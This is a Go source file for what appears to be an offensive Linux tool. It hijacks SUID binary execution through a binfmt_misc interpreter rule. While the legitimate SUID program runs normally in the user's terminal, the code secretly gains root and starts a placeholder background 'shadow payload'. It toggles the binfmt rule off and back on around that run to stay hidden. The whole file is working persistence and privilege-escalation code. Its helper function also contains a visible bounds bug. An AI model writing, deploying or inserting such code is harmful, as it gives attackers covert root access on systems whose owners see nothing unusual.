package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

/* INTERPRETER.GO
Use to execute a payload in the background while executing the command given to the interpreter via CLi with a tty
*/
const BINFMT_RULE = "/proc/sys/fs/binfmt_misc/CUSTOM_RULE_NAME"

//execHelper: return the exec.Cmd object providing an array of slice (all the job is to dtermine if the slice has more than 1 elt)
func execHelper(commandSlice []string) (command *exec.Cmd) {
	if len(commandSlice) < 1 {
		command = exec.Command(commandSlice[0])
	} else {
		command = exec.Command(commandSlice[0], commandSlice[1:]...)
	}
	return command
}

func main() {
	// Exec shadow payload
	go func(command string) {
		//Be root
		if err := syscall.Setuid(0); err != nil {
			os.Exit(1)
		}
		if err := syscall.Setgid(0); err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
			commandSlice := strings.Split(command, " ")
			shadowed := execHelper(commandSlice)
			shadowed.Start()
	}("CUSTOM_PAYLOAD")

	//TODO: wait for payload launch (or remove go routine)
	//disable interpreter
	err := os.WriteFile(BINFMT_RULE, []byte("0"), 0666)
	if err != nil {
		os.Exit(1)
	}

	//exectue legit SUID
	if len(os.Args) > 1 { //normally always the case
		cmd := execHelper(os.Args[1:])
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		if err := cmd.Run(); err != nil {
			fmt.Println(err)
		}

	}
	//re-enable interpreter
	err = os.WriteFile(BINFMT_RULE, []byte("1"), 0666)
	if err != nil {
		os.Exit(1)
	}
}
